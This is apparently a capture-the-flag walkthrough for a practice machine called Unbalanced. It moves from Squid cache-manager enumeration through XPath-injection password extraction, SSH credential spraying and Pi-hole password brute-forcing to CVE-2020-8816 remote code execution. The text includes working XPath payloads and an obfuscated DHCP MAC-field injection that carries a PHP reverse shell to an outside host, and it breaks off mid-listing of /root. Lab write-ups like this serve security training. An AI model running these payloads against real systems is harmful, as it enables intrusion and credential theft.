+COMMAND:
+================================================================================================
+username=admin&password=admin
+================================================================================================
+OUTPUT:
+================================================================================================
+Intranet-Host: intranet-host2.unbalanced.htb
+Intranet-Host: intranet-host3.unbalanced.htb
+================================================================================================
+
+One thing we notice though is the intranet hostname is changing after every request sending from
+burp. Most likely a load balancer. 
+
+One thing we also forgot to check is that we can attempt to manage squid since we have the 
+credentials for the cache manager remotely.
+
+As an administator of squid you may have known that you can access the configuration features 
+through the command line. Since we have the creds we can attempt to find what type of things we have
+access to. We can simply use curl for this.
+
+COMMAND:
+================================================================================================
+curl --user ':Thah$Sh1' http://10.10.10.200:3128/squid-internal-mgr/menu
+================================================================================================
+OUTPUT:
+================================================================================================
+ index                 	Cache Manager Interface         	disabled
+ menu                  	Cache Manager Menu              	protected
+ offline_toggle        	Toggle offline_mode setting     	disabled
+ shutdown              	Shut Down the Squid Process     	disabled
+ reconfigure           	Reconfigure Squid               	disabled
+ rotate                	Rotate Squid Logs               	disabled
+ pconn                 	Persistent Connection Utilization Histograms	protected
+ mem                   	Memory Utilization              	protected
+ diskd                 	DISKD Stats                     	protected
+ squidaio_counts       	Async IO Function Counters      	disabled
+ config                	Current Squid Configuration     	disabled
+ client_list           	Cache Client List               	disabled
+ comm_epoll_incoming   	comm_incoming() stats           	disabled
+ ipcache               	IP Cache Stats and Contents     	disabled
+ fqdncache             	FQDN Cache Stats and Contents   	protected
+ idns                  	Internal DNS Statistics         	disabled
+ redirector            	URL Redirector Stats            	disabled
+ store_id              	StoreId helper Stats            	disabled
+ external_acl          	External ACL stats              	disabled
+ http_headers          	HTTP Header Statistics          	disabled
+ info                  	General Runtime Information     	disabled
+ service_times         	Service Times (Percentiles)     	disabled
+ filedescriptors       	Process Filedescriptor Allocation	protected
+ objects               	All Cache Objects               	protected
+ vm_objects            	In-Memory and In-Transit Objects	protected
+ io                    	Server-side network read() size histograms	disabled
+ counters              	Traffic and Resource Counters   	protected
+ peer_select           	Peer Selection Algorithms       	disabled
+ digest_stats          	Cache Digest and ICP blob       	disabled
+ 5min                  	5 Minute Average of Counters    	protected
+ 60min                 	60 Minute Average of Counters   	protected
+ utilization           	Cache Utilization               	disabled
+ histograms            	Full Histogram Counts           	protected
+ active_requests       	Client-side Active Requests     	disabled
+ username_cache        	Active Cached Usernames         	disabled
+ openfd_objects        	Objects with Swapout files open 	disabled
+ store_digest          	Store Digest                    	disabled
+ store_log_tags        	Histogram of store.log tags     	disabled
+ storedir              	Store Directory Stats           	disabled
+ store_io              	Store IO Interface Stats        	disabled
+ store_check_cachable_stats	storeCheckCachable() Stats      	disabled
+ refresh               	Refresh Algorithm Statistics    	disabled
+ delay                 	Delay Pool Levels               	disabled
+ forward               	Request Forwarding Statistics   	disabled
+ cbdata                	Callback Data Registry Contents 	protected
+ sbuf                  	String-Buffer statistics        	protected
+ events                	Event Queue                     	protected
+ netdb                 	Network Measurement Database    	disabled
+ asndb                 	AS Number Database              	disabled
+ carp                  	CARP information                	disabled
+ userhash              	peer userhash information       	disabled
+ sourcehash            	peer sourcehash information     	disabled
+ server_list           	Peer Cache Statistics           	disabled
+
+================================================================================================
+
+We can now grep out the disabled functions and see what we can actually do.
+COMMAND:
+================================================================================================
+curl -s --user ':Thah$Sh1' http://10.10.10.200:3128/squid-internal-mgr/menu | grep -v disabled
+================================================================================================
+OUTPUT:
+================================================================================================
+ menu                  	Cache Manager Menu              	protected
+ pconn                 	Persistent Connection Utilization Histograms	protected
+ mem                   	Memory Utilization              	protected
+ diskd                 	DISKD Stats                     	protected
+ fqdncache             	FQDN Cache Stats and Contents   	protected
+ filedescriptors       	Process Filedescriptor Allocation	protected
+ objects               	All Cache Objects               	protected
+ vm_objects            	In-Memory and In-Transit Objects	protected
+ counters              	Traffic and Resource Counters   	protected
+ 5min                  	5 Minute Average of Counters    	protected
+ 60min                 	60 Minute Average of Counters   	protected
+ histograms            	Full Histogram Counts           	protected
+ cbdata                	Callback Data Registry Contents 	protected
+ sbuf                  	String-Buffer statistics        	protected
+ events                	Event Queue                     	protected
+================================================================================================
+
+One thing we may want to look out for is the fully qualified domain name cache so we look at it.
+COMMAND:
+================================================================================================
+curl -s --user ':Thah$Sh1' http://10.10.10.200:3128/squid-internal-mgr/fqdncache
+================================================================================================
+OUTPUT:
+================================================================================================
+FQDN Cache Statistics:
+FQDNcache Entries In Use: 9
+FQDNcache Entries Cached: 8
+FQDNcache Requests: 319
+FQDNcache Hits: 0
+FQDNcache Negative Hits: 11
+FQDNcache Misses: 308
+FQDN Cache Contents:
+
+Address                                       Flg TTL Cnt Hostnames
+127.0.1.1                                       H -001   2 unbalanced.htb unbalanced
+::1                                             H -001   3 localhost ip6-localhost ip6-loopback
+172.31.179.2                                    H -001   1 intranet-host2.unbalanced.htb
+172.31.179.3                                    H -001   1 intranet-host3.unbalanced.htb
+127.0.0.1                                       H -001   1 localhost
+172.17.0.1                                      H -001   1 intranet.unbalanced.htb
+ff02::1                                         H -001   1 ip6-allnodes
+ff02::2                                         H -001   1 ip6-allrouters
+================================================================================================
+
+The interesting thing is that we are not seeing host1 load balancer, most likely host1 will be the
+172.31.179.1, ip address. We can add this to hour hosts file and see if we can get through it.
+
+We try accessing via our web browser however it does not seem to be able to recongize it. So we
+attempt again by using the ip address itself and we get the following message.
+
+INFO:
+Host temporarily taken out of load balancing for security maintenance. 
+
+So we can access it however one thing we may want to try is specifying the last appended bit,
+"intranet.php" to our browser and see what we get.
+
+Interestingly enough we get the same login page as the previous load balancers. We will attempt a
+gobuster in the background.
+
+COMMAND:
+================================================================================================
+gobuster dir -p http://10.10.10.200:3128 -u http://172.31.179.1/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php,xml -o intranet-host1-gobuster.txt
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+
+We will have that running in the background. One thing we notice when we attempt to login again on
+this new site is that it now gives us the following when we guess the creds:
+  Invalid credentials.
+
+While before we did not receive any confirmation. The new number of bytes is now 7079 compared to 
+7059. Next thing we can attempt in our query is adding new special character for sql injection and 
+see if we get any output.
+
+COMMAND:
+================================================================================================
+username=admin'&password=admin
+================================================================================================
+
+Adding the single quote increased the bytes to 7185. We try an or statement now and see what we get.
+
+COMMAND:
+================================================================================================
+username=admin' or '1'='1' -- - &password=admin
+================================================================================================
+
+Whenever we see invalid credentials we now have a valid query. When there is no invalid creds 
+something crashed. If we add a balanced number of single quotes we don't get "Invalid Credentials"
+string, however if we add an "unbalanced" number of single quotes we get the match. 
+
+Actually adding any number of quotes does not yield the string mentioned before. We are not getting
+an additional cookies header to set a new cookie. 
+
+COMMAND:
+================================================================================================
+Username=admin' or '1'='1'&Password=admin We get 7185 bytes       
+Username=admin' or '1'='1&Password=admin  We get 7079 bytes
+================================================================================================
+
+Chances are that is not mysql database. Next thing to do is mess around with password field and see 
+if there is anything different.
+
+COMMAND:
+================================================================================================
+Username=admin' or '1'='1&Password=' or '1'='1
+================================================================================================
+OUTPUT:
+================================================================================================
+....
+...
+..
+
+  <div class="w3-row-padding w3-grayscale"><div class="w3-col m4 w3-margin-bottom"><div class="w3-light-grey"><p class='w3-opacity'>      rita</p><div class="w3-container"><h3>      Rita       Fubelli</h3><p>      rita@unbalanced.htb</p><p>Role:       HR Manager</p></div><p class='w3-opacity'>      jim</p><div class="w3-container"><h3>      Jim       Mickelson</h3><p>      jim@unbalanced.htb</p><p>Role:       Web Designer</p></div><p class='w3-opacity'>      bryan</p><div class="w3-container"><h3>      Bryan       Angstrom</h3><p>      bryan@unbalanced.htb</p><p>Role:       System Administrator</p></div><p class='w3-opacity'>      sarah</p><div class="w3-container"><h3>      Sarah       Goodman</h3><p>      sarah@unbalanced.htb</p><p>Role:       Team Leader</p></div></div></div></div>
+  </div>
+..
+...
+....
+================================================================================================
+
+And we get a larger output of 7852 bytes. If we scolled we get a list of emails. We do not know why
+it worked. If we try to make it an equal amount of quotes to be mysql. 
+INFO:
+================================================================================================
+Username=admin&Password=' or '1'='1' -- -
+================================================================================================
+
+Maybe it is not database at all, maybe its going of off xml and are doing xpath injection.
+So we google "Xpath injection comment" and we find the following payload we can try.
+INFO:
+" AND 1=0] | //*["1"="1"]
+
+Except we sub the duble quotes for single quotes
+
+COMMAND:
+================================================================================================
+#First attempt does not work
+' AND 1=0] | //*['1'='1']
+#Second attemtp works with following:
+Username=admin&Password=']| //*['1'='1
+================================================================================================
+OUTPUT:
+================================================================================================
+We get over 10000 bytes
+================================================================================================
+
+We turn intercept off and run it from its original page and see the extra output being displayed.
+The output we get is a long list of users, emails, and the users roles outputed.
+
+The payload confirms it is xpath injectable. We also give it another payload that gives out less
+but more concise info in the password field:
+
+COMMAND:
+================================================================================================
+' or '1'='1
+================================================================================================
+OUTPUT:
+================================================================================================
+ rita
+Rita Fubelli
+
+rita@unbalanced.htb
+
+Role: HR Manager
+
+jim
+Jim Mickelson
+
+jim@unbalanced.htb
+
+Role: Web Designer
+
+bryan
+Bryan Angstrom
+
+bryan@unbalanced.htb
+
+Role: System Administrator
+
+sarah
+Sarah Goodman
+
+sarah@unbalanced.htb
+
+Role: Team Leader
+================================================================================================
+
+We can now create a user list from which to use for potential ssh enumeration. Now we want to 
+enumerate the passwords since we can now apply some boolean logic to extract the passwords.
+
+First thing to do is find the password length.
+
+COMMAND:
+================================================================================================
+' or Username='rita' and string-length(Password/text())=1 or '2'='1
+
+Username=admin&Password=' or Username='rita' and string-length(Password/text())=1 or '2'='1
+================================================================================================
+OUTPUT:
+================================================================================================
+  Invalid credentials.
+================================================================================================
+
+Using the payoad we get invalid credentials, so we enumerate the by adding 1 to very single 
+query until we do not get the "invalid credentials" response
+
+COMMAND:
+================================================================================================
+Username=admin&Password=' or Username='rita' and string-length(Password/text())=1 or '2'='1
+Username=admin&Password=' or Username='rita' and string-length(Password/text())=2 or '2'='1
+Username=admin&Password=' or Username='rita' and string-length(Password/text())=3 or '2'='1
+Username=admin&Password=' or Username='rita' and string-length(Password/text())=4 or '2'='1
+Username=admin&Password=' or Username='rita' and string-length(Password/text())=5 or '2'='1
+Username=admin&Password=' or Username='rita' and string-length(Password/text())=6 or '2'='1
+Username=admin&Password=' or Username='rita' and string-length(Password/text())=7 or '2'='1
+Username=admin&Password=' or Username='rita' and string-length(Password/text())=8 or '2'='1
+Username=admin&Password=' or Username='rita' and string-length(Password/text())=9 or '2'='1
+Username=admin&Password=' or Username='rita' and string-length(Password/text())=10 or '2'='1
+Username=admin&Password=' or Username='rita' and string-length(Password/text())=11 or '2'='1
+
+================================================================================================
+
+When we hit 11 we don't get the invalid credntials response and the number of bytes(7347) returned 
+increased.
+
+Additionally we get Ritas information outputed.
+OUTPUT:
+================================================================================================
+<div class="w3-container"><h3>      Rita       Fubelli</h3><p>      rita@unbalanced.htb</p><p>Role:       HR Manager
+================================================================================================
+
+We can now to extract the password, this can be done in python or using burp intruder. We will be
+modifying the request by using substring and specifying the positioning of each character. The 
+xml postioning always starts with one, and finally the number of charcaters we want to extract 
+which will be equal to one. And then the character we want to test out.
+
+COMMAND:
+================================================================================================
+Username=admin&Password=' or Username='rita' and substring(Password,1,1) ='a
+================================================================================================
+OUTPUT:
+================================================================================================
+Username=admin&Password=' or Username='rita' and substring(Password,1,1) ='§a§
+Username=admin&Password=' or Username='rita' and substring(Password,2,1) ='§a§
+================================================================================================
+
+Using burp intruder we are able to find that the first letter of the password is p by looking 
+at the byte size that was returned in the response with p generating a different size in the
+reponse. However we would need the pro version of intruder if we want to accoplish more so instead
+we will use python. We can do the same thing except change the character position paramter and 
+increment it.
+
+
+INFO: The two strings we will need.
+================================================================================================
+Username=admin&Password=' or Username='rita' and string-length(Password/text())=11 or '2'='1
+Username=admin&Password=' or Username='rita' and substring(Password,1,1) ='a
+================================================================================================
+
+We create a script and run it based on those fundamentals.
+
+COMMAND:
+================================================================================================
+python3 brute.py
+================================================================================================
+OUTPUT:
+================================================================================================
+Password Length for jim is 16
+Password for jim is: stairwaytoheaven
+
+Password Length for bryan is 23
+Password for bryan is: ireallyl0vebubblegum!!!
+
+Password Length for sarah is 10
+Password for sarah is: sarah4evah
+
+Password Length for rita is 11
+Password for rita is: password01!
+================================================================================================
+
+Now that we have the list of usernames and passwords we can try a tool like crackmap exec or medusa
+to attempt to login via ssh on the machine.
+
+COMMAND:
+================================================================================================
+cme ssh 10.10.10.200 -u user.txt -p pass.txt
+================================================================================================
+OUTPUT:
+================================================================================================
+SSH         10.10.10.200    22     10.10.10.200     [*] SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
+SSH         10.10.10.200    22     10.10.10.200     [-] rita:stairwaytoheaven Authentication failed.
+SSH         10.10.10.200    22     10.10.10.200     [-] rita:ireallyl0vebubblegum!!! Authentication failed.
+SSH         10.10.10.200    22     10.10.10.200     [-] rita:sarah4evah Authentication failed.
+SSH         10.10.10.200    22     10.10.10.200     [-] rita:password01! Authentication failed.
+SSH         10.10.10.200    22     10.10.10.200     [-] rita: Authentication failed.
+SSH         10.10.10.200    22     10.10.10.200     [-] jim:stairwaytoheaven Authentication failed.
+SSH         10.10.10.200    22     10.10.10.200     [-] jim:ireallyl0vebubblegum!!! Authentication failed.
+SSH         10.10.10.200    22     10.10.10.200     [-] jim:sarah4evah Authentication failed.
+SSH         10.10.10.200    22     10.10.10.200     [-] jim:password01! Authentication failed.
+SSH         10.10.10.200    22     10.10.10.200     [-] jim: Authentication failed.
+SSH         10.10.10.200    22     10.10.10.200     [-] bryan:stairwaytoheaven Authentication failed.
+SSH         10.10.10.200    22     10.10.10.200     [+] bryan:ireallyl0vebubblegum!!! 
+================================================================================================
+
+We get a successful login with Bryan's account, now we can ssh and get a actual shell on the box.
+
+Once we get in we do an 'ls -a' and we find a user flag and a TODO file.
+COMMAND:
+================================================================================================
+ls -la
+================================================================================================
+OUTPUT:
+================================================================================================
+bryan@unbalanced:~$ ls -la
+total 32
+drwxr-xr-x 3 bryan bryan 4096 Jun 17 11:35 .
+drwxr-xr-x 3 root  root  4096 Jun 17 11:35 ..
+lrwxrwxrwx 1 root  root     9 Apr  3  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 bryan bryan  220 Apr  2  2020 .bash_logout
+-rw-r--r-- 1 bryan bryan 3526 Apr  2  2020 .bashrc
+drwx------ 3 bryan bryan 4096 Apr  2  2020 .gnupg
+-rw-r--r-- 1 bryan bryan  807 Apr  2  2020 .profile
+-rw-r--r-- 1 bryan bryan  798 Jun 17 11:35 TODO
+-rw-r--r-- 1 root  root    33 Dec  6 17:32 user.txt
+bryan@unbalanced:~$ cat TODO 
+############
+# Intranet #
+############
+* Install new intranet-host3 docker [DONE]
+* Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE]
+* Test intranet-host3 [DONE]
+* Add intranet-host3 to load balancer [DONE]
+* Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE]
+* Fix intranet-host2 [DONE]
+* Re-add intranet-host2 to load balancer (set default weight) [DONE]
+- Fix intranet-host1 [TODO]
+- Re-add intranet-host1 to load balancer (set default weight) [TODO]
+
+###########
+# Pi-hole #
+###########
+* Install Pi-hole docker (only listening on 127.0.0.1) [DONE]
+* Set temporary admin password [DONE]
+* Create Pi-hole configuration script [IN PROGRESS]
+- Run Pi-hole configuration script [TODO]
+- Expose Pi-hole ports to the network [TODO]
+
+================================================================================================
+
+Seems like the Bryan user was working with Pi-Hole. We have to figure out PI-holes address.
+We run ip neigh to see what ip addresses the machine has talked to lately
+
+COMMAND:
+================================================================================================
+ip neigh
+================================================================================================
+OUTPUT:
+================================================================================================
+172.31.179.3 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:b3:03 STALE
+172.31.179.2 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:b3:02 STALE
+10.10.10.2 dev ens160 lladdr 00:50:56:b9:3f:81 REACHABLE
+172.31.179.1 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:b3:01 STALE
+172.31.11.3 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:0b:03 STALE
+fe80::250:56ff:feb9:3f81 dev ens160 lladdr 00:50:56:b9:3f:81 router STALE
+================================================================================================
+
+One thing that stands out is the "172.31.11.3" ip address, we can try curling it to see what output 
+comes back.
+
+COMMAND:
+================================================================================================
+curl 172.31.11.3
+================================================================================================
+OUTPUT:
+================================================================================================
+
+    <html><head>
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+        <link rel='stylesheet' href='/pihole/blockingpage.css' type='text/css'/>
+    </head><body id='splashpage'><img src='/admin/img/logo.svg'/><br/>Pi-<b>hole</b>: Your black hole for Internet advertisements<br><a href='/admin'>Did you mean to go to the admin panel?</a></body></html>
+
+================================================================================================
+
+Looks like that is the ip for the pi-hole device. Our next step is to forward that port to our box.
+We can try and use ssh to achieve that.
+
+COMMAND:
+================================================================================================
+ssh -L 80:172.31.11.3:80 bryan@10.10.10.200
+================================================================================================
+
+We get the following back once we navigate to localhost
+OUTPUT:
+================================================================================================
+Open Source Ad Blocker Designed for Raspberry Pi
+
+localhost
+59
+
+[0]:https://raw.githubusercontent.com/StevenBlack/hosts/master/hosts
+[5]:https://hosts-file.net/ad_servers.txt
+
+Monday 5:18 AM, December 07th. Pi-hole v4.3.2-0-ge41c4b5 (pihole.unbalanced.htb/172.31.11.3)
+================================================================================================
+
+Its resolving to pi.hole so we want our hosts file to resolve to that. We navigate to localhost
+however it shows up as still blocked so we specify the pi.hole in our web request instead of 
+localhost and we are granted access.
+
+The gimmick with this is that pi hole was using the host header as an auth mechnaism.
+
+We have version 4.3.2 for pi hole so we can attempt to find a cve using searchsploit.
+
+COMMAND:
+================================================================================================
+searchsploit pi hole
+================================================================================================
+OUTPUT:
+================================================================================================
+------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                     |  Path
+------------------------------------------------------------------- ---------------------------------
+GNU Beep 1.3 - 'HoleyBeep' Local Privilege Escalation              | linux/local/44452.py
+Pi-Hole - heisenbergCompensator Blocklist OS Command Execution (Me | php/remote/48491.rb
+Pi-hole 4.3.2 - Remote Code Execution (Authenticated)              | python/webapps/48727.py
+Pi-hole 4.4.0 - Remote Code Execution (Authenticated)              | linux/webapps/48519.py
+Pi-hole < 4.4 - Authenticated Remote Code Execution                | linux/webapps/48442.py
+Pi-hole < 4.4 - Authenticated Remote Code Execution / Privileges E | linux/webapps/48443.py
+Pi-Hole Web Interface 2.8.1 - Persistent Cross-Site Scripting in W | linux/webapps/40249.txt
+------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+================================================================================================
+
+
+The problem with this exploit is that it needs to be authenticated so we are going to have to brute 
+force to attempt to guess the users password.
+
+We can use ffuf to try and brute force the password.
+COMMAND:
+================================================================================================
+ffuf -u http://pi.hole/admin/index.php?login -d 'pw=FUZZ' -w /usr/share/seclists/Passwords/cirt-default-passwords.txt
+================================================================================================
+OUTPUT:
+================================================================================================
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.0.2
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://pi.hole/admin/index.php?login
+ :: Data             : pw=FUZZ
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+0th                     [Status: 200, Size: 14427, Words: 4311, Lines: 274]
+1                       [Status: 200, Size: 14427, Words: 4311, Lines: 274]
+1111                    [Status: 200, Size: 14427, Words: 4311, Lines: 274]
+11111                   [Status: 200, Size: 14427, Words: 4311, Lines: 274]
+123                     [Status: 200, Size: 14427, Words: 4311, Lines: 274]
+11111111                [Status: 200, Size: 14427, Words: 4311, Lines: 274]
+                        [Status: 200, Size: 14427, Words: 4311, Lines: 274]
+!admin                  [Status: 200, Size: 14427, Words: 4311, Lines: 274]
+123123                  [Status: 200, Size: 14427, Words: 4311, Lines: 274]
+1234                    [Status: 200, Size: 14427, Words: 4311, Lines: 274]
+!root                   [Status: 200, Size: 14427, Words: 4311, Lines: 274]
+12345                   [Status: 200, Size: 14427, Words: 4311, Lines: 274]
+#l@$ak#.lk;0@P          [Status: 200, Size: 14427, Words: 4311, Lines: 274]
+2WSXcde                 [Status: 200, Size: 14427, Words: 4311, Lines: 274]
+123456                  [Status: 200, Size: 14427, Words: 4311, Lines: 274]
+0                       [Status: 200, Size: 14427, Words: 4311, Lines: 274]
+$SRV                    [Status: 200, Size: 14427, Words: 4311, Lines: 274]
+0000                    [Status: 200, Size: 14427, Words: 4311, Lines: 274]
+12345678                [Status: 200, Size: 14427, Words: 4311, Lines: 274]
+000000                  [Status: 200, Size: 14427, Words: 4311, Lines: 274]
+
+================================================================================================
+
+We can now attempt to filter out the words 4311.
+
+COMMAND:
+================================================================================================
+ffuf -u http://pi.hole/admin/index.php?login -d 'pw=FUZZ' -w /usr/share/seclists/Passwords/cirt-default-passwords.txt -fw 4311
+================================================================================================
+OUTPUT:
+================================================================================================
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.0.2
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://pi.hole/admin/index.php?login
+ :: Data             : pw=FUZZ
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+ :: Filter           : Response words: 4311
+________________________________________________
+
+:: Progress: [1039/1039] :: Job [1/1] :: 45 req/sec :: Duration: [0:00:23] :: Errors: 35 ::
+
+================================================================================================
+
+It does not seem to work so one thing, that we want to do with ffuf is add the content-type 
+to the query. We can get this value from the burp request we sent originally.
+
+COMMAND:
+================================================================================================
+ffuf -u http://pi.hole/admin/index.php?login -d 'pw=FUZZ' -w /usr/share/seclists/Passwords/cirt-default-passwords.txt -fw 4311 -H 'Content-Type: application/x-www-form-urlencoded'
+================================================================================================
+OUTPUT:
+================================================================================================
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.0.2
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://pi.hole/admin/index.php?login
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Data             : pw=FUZZ
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+ :: Filter           : Response words: 4311
+________________________________________________
+
+!root                   [Status: 200, Size: 14609, Words: 4350, Lines: 277]
+$SRV                    [Status: 200, Size: 14609, Words: 4350, Lines: 277]
+* * #                   [Status: 200, Size: 14609, Words: 4350, Lines: 277]
+#l@$ak#.lk;0@P          [Status: 200, Size: 14609, Words: 4350, Lines: 277]
+0                       [Status: 200, Size: 14609, Words: 4350, Lines: 277]
+*3noguru                [Status: 200, Size: 14609, Words: 4350, Lines: 277]
+000000                  [Status: 200, Size: 14609, Words: 4350, Lines: 277]
+0000                    [Status: 200, Size: 14609, Words: 4350, Lines: 277]
+0th                     [Status: 200, Size: 14609, Words: 4350, Lines: 277]
+00000000                [Status: 200, Size: 14609, Words: 4350, Lines: 277]
+06071992                [Status: 200, Size: 14609, Words: 4350, Lines: 277]
+1                       [Status: 200, Size: 14609, Words: 4350, Lines: 277]
+11111                   [Status: 200, Size: 14609, Words: 4350, Lines: 277]
+1111                    [Status: 200, Size: 14609, Words: 4350, Lines: 277]
+123123                  [Status: 200, Size: 14609, Words: 4350, Lines: 277]
+123                     [Status: 200, Size: 14609, Words: 4350, Lines: 277]
+11111111                [Status: 200, Size: 14609, Words: 4350, Lines: 277]
+123456                  [Status: 200, Size: 14609, Words: 4350, Lines: 277]
+1234                    [Status: 200, Size: 14609, Words: 4350, Lines: 277]
+12345                   [Status: 200, Size: 14609, Words: 4350, Lines: 277]
+12345678                [Status: 200, Size: 14609, Words: 4350, Lines: 277]
+1234567890              [Status: 200, Size: 14609, Words: 4350, Lines: 277]
+123qwe                  [Status: 200, Size: 14609, Words: 4350, Lines: 277]
+
+================================================================================================
+
+However this time around we want to filter out words with 4350. If you get errors try lowering the 
+number of threads being used by ffuf. 
+
+COMMAND:
+================================================================================================
+ffuf -u http://pi.hole/admin/index.php?login -d 'pw=FUZZ' -w /usr/share/seclists/Passwords/cirt-default-passwords.txt -fw 4350 -H 'Content-Type: application/x-www-form-urlencoded' -t 1
+================================================================================================
+OUTPUT:
+================================================================================================
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.0.2
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://pi.hole/admin/index.php?login
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Data             : pw=FUZZ
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+ :: Filter           : Response words: 4350
+________________________________________________
+
+admin                   [Status: 302, Size: 0, Words: 1, Lines: 1]
+:: Progress: [1039/1039] :: Job [1/1] :: 10 req/sec :: Duration: [0:01:40] :: Errors: 161 ::
+================================================================================================
+
+We get the admin string as the password. Now we can use the authenticated exploit. 
+Apparently the script error out while running, the next best thing to do is do it manually
+using blog posts.
+
+COMMAND:
+================================================================================================
+python3 48443.py q1ltsrvk18p3v5gc4fhtsr9tk1 http://pi.hole/admin/index.php 10.10.14.21 5555
+================================================================================================
+OUTPUT:
+================================================================================================
+[+] Put Root Stager Success
+Exception ignored in thread started by: <function send_response at 0x7fc5353eddc0>
+Traceback (most recent call last):
+  File "48443.py", line 46, in send_response
+    sock.bind((LOCAL_IP,int(80)))
+OSError: [Errno 98] Address already in use
+Exception ignored in thread started by: <function send_response at 0x7fc5353eddc0>
+Traceback (most recent call last):
+  File "48443.py", line 46, in send_response
+    sock.bind((LOCAL_IP,int(80)))
+OSError: [Errno 98] Address already in use
+[+] Put Shell Stager Success
+Exception ignored in thread started by: <function send_response at 0x7fc5353eddc0>
+Traceback (most recent call last):
+  File "48443.py", line 46, in send_response
+    sock.bind((LOCAL_IP,int(80)))
+OSError: [Errno 98] Address already in use
+[+] Triggering Exploit
+
+================================================================================================
+
+Looks like the exploit is doing some type of command injection inside of dhcp, you put ome type of 
+legitimate mac and a nasty payload. 
+
+We will grab the custom payload from the following blog post:
+https://natedotred.wordpress.com/2020/03/28/cve-2020-8816-pi-hole-remote-code-execution/
+
+We will then  modify and encode it using cyber chef.
+
+COMMAND:
+================================================================================================
+$P$H$P$IFS-$R$IFS’EXEC(HEX2BIN(“706870202D72202724736F636B3D66736F636B6F70656E282231302E312E302E39222C32323536293B6578656328222F62696E2F7368202D69203C2633203E263320323E263322293B27”));’
+
+aaaaaaaaaaaa&&W=${PATH#/???/}&&P=${W%%?????:*}&&X=${PATH#/???/??}&&H=${X%%???:*}&&Z=${PATH#*:/??}&&R=${Z%%/*}&&$P$H$P$IFS-$R$IFS’EXEC(HEX2BIN(“706870202D72202724736F636B3D66736F636B6F70656E282231302E312E302E39222C32323536293B6578656328222F62696E2F7368202D69203C2633203E263320323E263322293B27”));’&&
+================================================================================================
+We are going to removespecial characters that do not look like ascii
+OUTPUT:
+================================================================================================
+php -r '$sock=fsockopen("10.10.14.21",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+706870202d72202724736f636b3d66736f636b6f70656e282231302e31302e31342e3231222c35353535293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27
+
+aaaaaaaaaaaa&&W=${PATH#/???/}&&P=${W%%?????:*}&&X=${PATH#/???/??}&&H=${X%%???:*}&&Z=${PATH#*:/??}&&R=${Z%%/*}&&$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN("706870202d72202724736f636b3d66736f636b6f70656e282231302e31302e31342e3231222c35353535293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27"));'&&
+================================================================================================
+
+Now we go to pi-hole, settings, dhcp, then we enter the payload inside the MAC address field and
+set the ip and hostname to whatever and add the exlusion and we get a shell back to our listeing 
+port.
+
+Now we login as www-data but the interesting thing is we can read root files from this user, making
+these iot devices notoriously insecure. If we go to the root directory we can open a file that has
+creds.
+
+COMMAND:
+================================================================================================
+
+================================================================================================
+OUTPUT:
+================================================================================================
+$ pwd
+/root
+$ cd /root
+$ ls -la
+total 132
+drwxrwxr-x 1 root root   4096 Apr  5  2020 .
+drwxr-xr-x 1 root root   4096 Jul 30 05:13 ..
+lrwxrwxrwx 1 root root      9 Apr  4  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 root root    570 Jan 31  2010 .bashrc
+-rw-r--r-- 1 root root    148 Aug 17  2015 .profile
+-rw-r--r-- 1 root root 113876 Sep 20  2019 ph_install.sh
